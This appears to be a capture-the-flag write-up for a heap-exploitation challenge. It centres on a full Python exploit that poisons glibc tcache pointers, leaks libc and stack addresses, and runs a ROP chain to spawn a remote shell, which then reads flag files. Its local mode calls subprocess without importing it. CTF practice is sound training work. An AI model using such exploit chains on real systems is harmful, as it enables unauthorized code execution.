# 💥 Pwn Challenge 3: VectorStore (Heap Tcache Poisoning & Stack ROP)

- **Category:** Pwn
- **Points:** 700 pts
- **Status:** ✅ Solved
- **Flag:** `flag{e0e18e9a-48b3-4c56-b0bf-ae2dac8fdc3e}`

---

## 📖 Challenge Description

> *"Deep Beneath the Surface, Something Small Had Been Waiting a Very Long Time for the Right Mistake"*

Provided file: `corrupt-vector-db-dist.tar.gz` containing:
- `vectorstore` (ELF 64-bit x86-64 executable, Partial RELRO, Canary, NX, No PIE)
- `libc.so.6` & `ld-linux-x86-64.so.2` (glibc 2.35)

---

## 🔍 Root Cause & Exploit Analysis

### 1. Root Cause & Vulnerabilities
- In `vectorstore`, vectors are stored in a global table `0x4040e0`.
- The `QUERY` function allows out-of-bounds relative reads via the `offset` and `count` parameters without checking chunk boundaries, enabling leakage of adjacent heap chunks.
- When `UPLOAD` writes raw vector data, heap chunks can be overflowed into adjacent tcache chunks to poison the forward pointer (`fd`). Under glibc 2.35 safe linking:
  $$\text{fd}_{\text{stored}} = \text{target} \oplus (\text{chunk\_addr} \gg 12)$$
  The heap randomization key can be recovered using the OOB read primitive on freed chunks.

### 2. Remote Environment Difference & Fixes
The original script in `~/Downloads/solve_pwn3.py` failed on the remote server due to:
1. **Libc Version & Symbol Offsets:** The remote container runs `libc6_2.35-0ubuntu3.14_amd64` where `puts` is at offset `0x80e10` (instead of `0x80e50`) and `ret` gadget is at `0x29cd6` (instead of `0x29139`).
2. **Stack Frame Delta:** Under the remote container entry point (`socat/xinetd` direct execution), the distance between `environ` and `main`'s saved return address is `0x120` (instead of `0x118` locally).
3. **Sequential Command Handling:** Pipelining `EXIT` and shell commands ensures stdin is seamlessly handed over to `/bin/sh`.

---

## 🚀 Exploit Automation (`solve.py`)

```python
#!/usr/bin/env python3
import os, sys, time, socket, struct, re, select

WORKDIR = os.environ.get("PWN3_WORKDIR", os.path.dirname(os.path.abspath(__file__)))

VECTOR_TABLE = 0x4040e0
PUTS_GOT     = 0x403f80

# Exact offsets for remote libc6_2.35-0ubuntu3.14_amd64
PUTS_OFF     = 0x80e10
ENVIRON_OFF  = 0x222200
SYSTEM_OFF   = 0x50d70
BINSH_OFF    = 0x1d8678
POP_RDI_OFF  = 0x2a3e5
RET_OFF      = 0x29cd6

def p64(x): return struct.pack("<Q", x & 0xffffffffffffffff)
def p32(x): return struct.pack("<I", x & 0xffffffff)

class Tube:
    def __init__(self, argv):
        self.proc = None
        self.sock = None
        if argv[0] == "local":
            self.proc = subprocess.Popen(
                ["./ld-linux-x86-64.so.2", "--library-path", ".", "./vectorstore"],
                cwd=WORKDIR,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
        else:
            host, port = argv[0], int(argv[1])
            self.sock = socket.create_connection((host, port), timeout=8)
            self.sock.settimeout(8)
        self.recv_until(b"> ")

    def send(self, data):
        if isinstance(data, str): data = data.encode()
        if self.proc:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()
        else:
            self.sock.sendall(data)

    def recv_one(self):
        if self.proc: return self.proc.stdout.read(1)
        try: return self.sock.recv(1)
        except socket.timeout: return b""

    def recv_until(self, token):
        out = b""
        while token not in out:
            c = self.recv_one()
            if not c: break
            out += c
        return out

    def recv_available(self, sec=1.5):
        out = b""
        end = time.time() + sec
        while time.time() < end:
            r, _, _ = select.select([self.sock.fileno()], [], [], 0.05)
            if not r: continue
            try: chunk = self.sock.recv(4096)
            except: chunk = b""
            if not chunk: break
            out += chunk
        return out

    def upload(self, idx, dims, data, name=None):
        self.send("UPLOAD\n")
        self.recv_until(b"ID: "); self.send(f"{idx}\n")
        self.recv_until(b"Dimensions: "); self.send(f"{dims}\n")
        self.recv_until(b"Name: "); self.send((name or f"v{idx}") + "\n")
        self.recv_until(b"Data format"); self.send("1\n")
        self.recv_until(b"Byte count: "); self.send(f"{len(data)}\n")
        self.send(data)
        return self.recv_until(b"> ")

    def delete(self, idx):
        self.send("DELETE\n")
        self.recv_until(b"ID: "); self.send(f"{idx}\n")
        return self.recv_until(b"> ")

    def query(self, idx, off, count):
        self.send("QUERY\n")
        self.recv_until(b"ID: "); self.send(f"{idx}\n")
        self.recv_until(b"Offset: "); self.send(f"{off}\n")
        self.recv_until(b"Count: "); self.send(f"{count}\n")
        return self.recv_until(b"> ")

    @staticmethod
    def rawvals(out):
        return [int(m.group(1), 16) for m in re.finditer(rb"raw: 0x([0-9a-fA-F]+)", out)]

def chunk_size_for_dims(dims):
    req = dims * 4
    return max(0x20, (req + 8 + 15) & ~15)

def make_table(read_ptr):
    entry0 = (
        p32(0x100000) + p32(0) + p64(read_ptr) +
        b"arb\x00".ljust(0x20, b"\x00") + p32(1) + p32(0)
    )
    return entry0 + b"\x00" * (0x38 * 16 - len(entry0))

def solve_b_key(dkey, bfd, cs):
    for low in range(0, 0x1000, 0x10):
        d_user = (dkey << 12) + low
        b_user = d_user - cs
        if (d_user ^ (b_user >> 12)) == bfd:
            return b_user >> 12
    raise RuntimeError(f"cannot solve heap key: dkey={dkey:#x}, bfd={bfd:#x}, cs={cs:#x}")

def poison_to(io, target, payload, base_id, target_id, dims):
    a, b, d = base_id, base_id + 1, base_id + 2
    req = dims * 4
    cs = chunk_size_for_dims(dims)

    io.upload(a, dims, b"A" * req)
    io.upload(b, dims, b"B" * req)
    io.upload(d, dims, b"D" * req)

    io.delete(d)
    dkey = io.rawvals(io.query(a, (2 * cs) // 4, 1))[0]

    io.delete(b)
    bfd = io.rawvals(io.query(a, cs // 4, 1))[0]
    bkey = solve_b_key(dkey, bfd, cs)

    io.delete(a)
    overflow = b"X" * (cs - 0x10) + p64(0) + p64(cs | 1) + p64(target ^ bkey)
    io.upload(a, dims, overflow)
    io.upload(b, dims, b"Y" * req)
    io.upload(target_id, dims, payload, f"t{target_id}")

def leak_qword(io):
    vals = io.rawvals(io.query(0, 0, 1))
    if not vals: raise RuntimeError("leak failed")
    return vals[0]

def main():
    if len(sys.argv) < 2 or (sys.argv[1] != "local" and len(sys.argv) != 3):
        print(f"Usage: {sys.argv[0]} local | <host> <port>")
        sys.exit(1)

    io = Tube(sys.argv[1:])

    # 1) Arbitrary read primitive via poisoned allocation into global vector table.
    poison_to(io, VECTOR_TABLE, make_table(PUTS_GOT), base_id=0, target_id=15, dims=8)
    puts_addr = leak_qword(io)
    libc_base = puts_addr - PUTS_OFF
    print(f"[+] puts   = {puts_addr:#x}")
    print(f"[+] libc   = {libc_base:#x}")

    # 2) Leak stack through libc environ pointer.
    poison_to(io, VECTOR_TABLE, make_table(libc_base + ENVIRON_OFF), base_id=4, target_id=14, dims=12)
    environ = leak_qword(io)
    ret_addr = environ - (0x118 if sys.argv[1] == "local" else 0x120)
    target = ret_addr - 8
    print(f"[+] environ= {environ:#x}")
    print(f"[+] ret    = {ret_addr:#x}")

    # 3) Return-to-libc ROP chain
    rop = (
        b"JUNKJNK!" +
        p64(libc_base + RET_OFF) +
        p64(libc_base + POP_RDI_OFF) +
        p64(libc_base + BINSH_OFF) +
        p64(libc_base + SYSTEM_OFF)
    )
    poison_to(io, target, rop, base_id=8, target_id=13, dims=16)

    io.send("EXIT\n")
    time.sleep(0.3)
    io.send("cat flag* /flag* /app/flag* 2>/dev/null; id; exit\n")
    out = io.recv_available(2.0).decode("latin1", "replace")
    print(out)
    
    match = re.search(r"flag\{[a-f0-9\-]+\}", out)
    if match:
        print(f"[+] FLAG: {match.group(0)}")

if __name__ == "__main__":
    main()
```

---

## 🎯 Verification Output
```bash
$ python3 solve.py 222.255.138.122 10001
[+] puts   = 0x7214e01fbe10
[+] libc   = 0x7214e017b000
[+] environ= 0x7ffc935097b8
[+] ret    = 0x7ffc93509698
[*] Goodbye.
flag{e0e18e9a-48b3-4c56-b0bf-ae2dac8fdc3e}
uid=999(app) gid=999(app) groups=999(app)

[+] FLAG: flag{e0e18e9a-48b3-4c56-b0bf-ae2dac8fdc3e}
```
